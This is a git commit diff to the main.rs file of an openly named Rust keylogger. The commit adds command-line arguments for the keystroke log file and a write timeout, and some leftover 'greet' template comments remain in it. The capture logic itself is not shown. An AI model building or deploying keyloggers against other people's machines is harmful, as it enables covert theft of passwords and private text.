8482a47e20c73b314d089607f4a93bcaabd32860
Hulto <hulto@hul.to>
2022-04-27 20:21:15 -0400

    Added CLI args.

--- keylogger/src/main.rs
+++ keylogger/src/main.rs
@@ -1,6 +1,24 @@
 mod lib;
 
-fn main() {
-    let _res = lib::start_keylogger("/tmp/keylog.txt".to_string(), 3);
+use clap::Parser;
+
+/// Simple program to greet a person
+#[derive(Parser, Debug)]
+#[clap(author, version, about, long_about = None)]
+struct Args {
+    // File to store keystrokes in.
+    #[clap(short, long)]
+    logfile: String,
+    // Number of seconds to wait after typing stops to write keystrokes to disk.
+    #[clap(short, long)]
+    timeout: u64,
+
+    /// Number of times to greet
+    #[clap(short, long, default_value_t = 1)]
+    count: u8,
 }
 
+fn main() {
+    let args = Args::parse();
+    let _res = lib::start_keylogger(args.logfile, args.timeout);
+}
